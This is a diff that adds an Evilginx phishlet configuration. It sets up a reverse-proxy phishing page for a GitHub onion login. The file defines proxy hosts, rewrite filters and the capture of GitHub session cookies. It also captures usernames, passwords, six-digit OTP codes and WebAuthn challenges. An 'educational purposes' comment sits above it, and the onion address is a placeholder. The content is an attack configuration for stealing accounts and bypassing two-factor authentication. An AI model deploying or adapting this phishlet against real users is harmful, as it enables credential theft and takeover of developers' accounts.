@@ -1,0 +1,72 @@
+# GitHub .onion phishlet example
+# GitHub has an official onion service for enhanced privacy
+# This is an example of how to create a phishlet for a real onion service
+#
+# Prerequisites:
+# 1. Tor running: sudo systemctl start tor
+# 2. In Evilginx: proxy socks5h 127.0.0.1 9050 && proxy on
+#
+# Note: This is for educational purposes. Actual GitHub onion address may differ.
+
+min_ver: '3.0.0'
+
+proxy_hosts:
+  # GitHub's onion service (example address - verify actual address)
+  - phish_sub: 'github'
+    orig_sub: ''
+    domain: 'github.?????????????????????.onion'  # Replace with actual GitHub onion address
+    session: true
+    is_landing: true
+    auto_filter: true
+
+# Filter to handle various GitHub domains
+sub_filters:
+  # Replace onion references
+  - triggers_on: 'github.?????????????????????.onion'
+    orig_sub: ''
+    domain: 'github.?????????????????????.onion'
+    search: 'github\.[a-z0-9]{56}\.onion'
+    replace: 'github.{domain}'
+    mimes: ['text/html', 'application/javascript']
+    
+  # Fix API calls
+  - triggers_on: 'github.?????????????????????.onion'
+    orig_sub: ''
+    domain: 'github.?????????????????????.onion'
+    search: '/api\.github\.onion'
+    replace: '/api.{domain}'
+    mimes: ['text/html', 'application/javascript']
+
+# GitHub uses several session cookies
+auth_tokens:
+  - domain: '.github.?????????????????????.onion'
+    keys: ['user_session', 'logged_in', '__Host-user_session_same_site']
+    
+  - domain: '.github.?????????????????????.onion'
+    keys: ['dotcom_user', '_gh_sess']
+    optional: true
+
+# GitHub login credentials
+credentials:
+  username:
+    key: 'login'                    # GitHub uses 'login' instead of 'username'
+    search: '(.*)'
+    type: 'post'
+    
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+    
+  custom:
+    - key: 'otp'                    # Two-factor authentication code
+      search: '([0-9]{6})'
+      type: 'post'
+    - key: 'webauthn_challenge'     # WebAuthn/FIDO2 challenge
+      search: '(.*)'
+      type: 'post'
+
+# GitHub login page
+login:
+  domain: 'github.?????????????????????.onion'
+  path: '/login'
